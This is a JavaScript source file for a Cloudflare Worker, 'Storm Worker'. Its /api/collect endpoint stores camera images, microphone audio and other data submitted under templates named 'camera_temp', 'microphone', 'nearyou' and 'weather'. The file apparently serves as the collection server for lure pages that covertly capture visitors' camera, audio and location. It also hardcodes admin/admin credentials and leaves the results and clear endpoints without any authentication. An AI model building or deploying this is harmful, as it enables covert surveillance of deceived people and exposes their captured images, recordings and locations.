import { Hono } from "hono";
import { OpenAPIRoute, fromHono, getSwaggerUI } from "chanfana";
import { OpenAPIRegistry, OpenApiGeneratorV3 } from "@asteasolutions/zod-to-openapi";
import { z } from "zod";
import RealtimeKitAPI from '@cloudflare/realtimekit';
import { extendZodWithOpenApi } from "@asteasolutions/zod-to-openapi";

extendZodWithOpenApi(z);

const app = new Hono();
const registry = new OpenAPIRegistry();

// --- Schemas ---
const LoginSchema = z.object({
  username: z.string().openapi({ example: 'admin' }),
  password: z.string().openapi({ example: 'admin' }),
});

const CollectSchema = z.object({
    template: z.string().openapi({ example: 'normal_data' }),
    data: z.any().openapi({ example: { "key": "value" } }),
});

const MeetingSchema = z.object({
    title: z.string().optional().openapi({ example: 'My Meeting' }),
});

// --- Routes ---

class PingRoute extends OpenAPIRoute {
  schema = {
    tags: ["Health"],
    summary: "Health check endpoint",
    responses: {
      "200": {
        description: "Service is healthy",
        content: {
          "application/json": {
            schema: z.object({
              status: z.string(),
              timestamp: z.string(),
              service: z.string(),
            }),
          },
        },
      },
    },
  };

  async handle(c) {
    return c.json({
      status: "ok",
      timestamp: new Date().toISOString(),
      service: "storm-worker",
    });
  }
}

class LoginRoute extends OpenAPIRoute {
  schema = {
    tags: ["Authentication"],
    summary: "Login to get a token",
    request: {
        body: {
            content: {
                "application/json": {
                    schema: LoginSchema,
                },
            },
        },
    },
    responses: {
      "200": {
        description: "Login successful",
        content: {
          "application/json": {
            schema: z.object({
              success: z.boolean(),
              token: z.string(),
            }),
          },
        },
      },
      "401": {
        description: "Unauthorized",
        content: {
            "application/json": {
              schema: z.object({
                success: z.boolean(),
              }),
            },
          },
      }
    },
  };

  async handle(c) {
    const { username, password } = await c.req.json();
    const USERS = {
      admin: 'admin',
    };
    if (USERS[username] === password) {
      return c.json({ success: true, token: 'dummy-token' });
    }
    return c.json({ success: false }, 401);
  }
}

class GetResultsRoute extends OpenAPIRoute {
    schema = {
        tags: ["Data"],
        summary: "Get all collected data logs",
        responses: {
            "200": {
                description: "List of logs",
                content: {
                    "application/json": {
                        schema: z.array(z.object({
                            id: z.number(),
                            timestamp: z.string(),
                            template: z.string(),
                            data: z.string(), // It's a JSON string in the DB
                        })),
                    },
                },
            },
            "500": {
                description: "Error fetching results",
            }
        }
    }

    async handle(c) {
        try {
            const { results } = await c.env.DB.prepare('SELECT * FROM logs ORDER BY timestamp DESC').all();
            return c.json(results);
        } catch (e) {
            console.error(e);
            return c.json({ success: false, error: 'Failed to read from database.' }, 500);
        }
    }
}

class ClearRoute extends OpenAPIRoute {
    schema = {
        tags: ["Data"],
        summary: "Clear all collected data logs",
        responses: {
            "200": {
                description: "Logs cleared successfully",
                content: {
                    "application/json": {
                        schema: z.object({
                            success: z.boolean(),
                        }),
                    },
                },
            },
            "500": {
                description: "Error clearing logs",
            }
        }
    }

    async handle(c) {
        try {
            await c.env.DB.prepare('DELETE FROM logs').run();
            return c.json({ success: true });
        } catch (e) {
            console.error(e);
            return c.json({ success: false, error: 'Failed to clear database.' }, 500);
        }
    }
}

class CollectRoute extends OpenAPIRoute {
    schema = {
        tags: ["Data"],
        summary: "Collect data",
        request: {
            body: {
                content: {
                    "application/json": {
                        schema: CollectSchema,
                    },
                },
            },
        },
        responses: {
            "200": {
                description: "Data collected successfully",
            },
            "500": {
                description: "Failed to collect data",
            }
        }
    }

    async handle(c) {
        const { template, data } = await c.req.json();

        try {
            let fileUrl = null;
            let logData = data;

            if (template === 'camera_temp' && data.image) {
                const key = `image-${Date.now()}.png`;
                const body = Buffer.from(data.image, 'base64');
                await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'image/png' } });
                fileUrl = `/r2/${key}`;
                logData = { ...data, imageUrl: fileUrl, image: undefined };
            } else if (template === 'microphone' && data.audio) {
                const key = `audio-${Date.now()}.wav`;
                const audioBase64 = data.audio.split(',')[1];
                const body = Buffer.from(audioBase64, 'base64');
                await c.env.BUCKET.put(key, body, { httpMetadata: { contentType: 'audio/wav' } });
                fileUrl = `/r2/${key}`;
                logData = { ...data, audioUrl: fileUrl, audio: undefined };
            }

            const stmt = c.env.DB.prepare(
                'INSERT INTO logs (template, data) VALUES (?, ?)'
            ).bind(template, JSON.stringify(logData));
            await stmt.run();

            return c.text('Data collected successfully.');
        } catch (e) {
            console.error(e);
            return c.json({ success: false, error: 'Failed to write to database/bucket. Make sure you have run migrations and configured bindings.' }, 500);
        }
    }
}

class ListTemplatesRoute extends OpenAPIRoute {
    schema = {
        tags: ["Templates"],
        summary: "Get list of available templates",
        responses: {
            "200": {
                description: "A list of templates",
                content: {
                    "application/json": {
                        schema: z.array(z.string()),
                    },
                },
            },
        },
    };

    async handle(c) {
        const templates = [
            "camera_temp",
            "microphone",
            "nearyou",
            "normal_data",
            "weather",
        ];
        return c.json(templates);
    }
}

class CreateMeetingRoute extends OpenAPIRoute {
    schema = {
        tags: ["Meetings"],
        summary: "Create or join a real-time meeting",
        request: {
            body: {
                content: {
                    "application/json": {
                        schema: MeetingSchema,
                    },
                },
            },
        },
        responses: {
            "200": {
                description: "Meeting details",
                content: {
                    "application/json": {
                        schema: z.object({
                            meetingId: z.string(),
                            authToken: z.string(),
                        }),
                    },
                },
            },
            "500": {
                description: "Failed to create or join meeting",
            }
        }
    }

    async handle(c) {
        const { title } = await c.req.json();
        const ACTIVE_MEETING_KEY = 'active_meeting_id';

        const realtime = new RealtimeKitAPI(c.env.REALTIMEKIT_API_KEY, {
            realtimeKitOrgId: c.env.REALTIMEKIT_ORG_ID,
        });

        try {
            let meetingId = await c.env.KV.get(ACTIVE_MEETING_KEY);

            if (!meetingId) {
                console.log('No active meeting found, creating a new one.');
                const meeting = await realtime.createMeeting({
                    title: title || 'Live Stream',
                    recordOnStart: true,
                });
                meetingId = meeting.id;
                await c.env.KV.put(ACTIVE_MEETING_KEY, meetingId);
            } else {
                console.log(`Found active meeting: ${meetingId}`);
            }

            const participant = await realtime.addParticipant(meetingId, {
                name: 'Viewer',
                presetName: 'group_call_participant',
                customParticipantId: 'viewer-' + Math.random().toString(36).substring(7),
            });

            return c.json({
                meetingId: meetingId,
                authToken: participant.token,
            });
        } catch (error) {
            console.error(error);
            return c.json({ success: false, error: 'Failed to create or join meeting' }, 500);
        }
    }
}

class EndMeetingRoute extends OpenAPIRoute {
    schema = {
        tags: ["Meetings"],
        summary: "End the active meeting",
        responses: {
            "200": {
                description: "Meeting ended",
                content: {
                    "application/json": {
                        schema: z.object({
                            success: z.boolean(),
                            message: z.string(),
                        }),
                    },
                },
            },
        }
    }

    async handle(c) {
        const ACTIVE_MEETING_KEY = 'active_meeting_id';
        await c.env.KV.delete(ACTIVE_MEETING_KEY);
        return c.json({ success: true, message: 'Active meeting ended.' });
    }
}


// --- Register Routes ---
app.get("/ping", PingRoute);
app.post('/api/login', LoginRoute);
app.get('/api/results', GetResultsRoute);
app.post('/api/clear', ClearRoute);
app.post('/api/collect', CollectRoute);
app.get('/api/templates', ListTemplatesRoute);
app.post('/api/meetings', CreateMeetingRoute);
app.post('/api/meetings/end', EndMeetingRoute);


// --- R2 File Serving (not part of OpenAPI spec) ---
app.get('/r2/:key', async (c) => {
    const key = c.req.param('key');
    const object = await c.env.BUCKET.get(key);

    if (object === null) {
        return c.notFound();
    }

    const headers = new Headers();
    object.writeHttpMetadata(headers);
    headers.set('etag', object.httpEtag);

    return new Response(object.body, {
        headers,
    });
});


// Hook chanfana into Hono
fromHono(app, registry);

// Generate OpenAPI documentation
const generator = new OpenApiGeneratorV3(registry.definitions);
const openApiDoc = generator.generateDocument({
    openapi: '3.1.0',
    info: {
        title: "Storm Worker API",
        version: "1.0.0",
        description: "Cloudflare Worker with RealtimeKit integration",
    },
});

// Serve documentation
app.get("/docs", (c) => c.html(getSwaggerUI({ url: "/openapi.json" })));
app.get("/openapi.json", (c) => c.json(openApiDoc));

// Root route
app.get("/", (c) => c.json({ message: "Storm Worker is running!" }));

// --- Static Asset Serving ---
// This should be the last route
app.get('*', (c) => {
  return c.env.ASSETS.fetch(c.req.raw);
});


export default app;
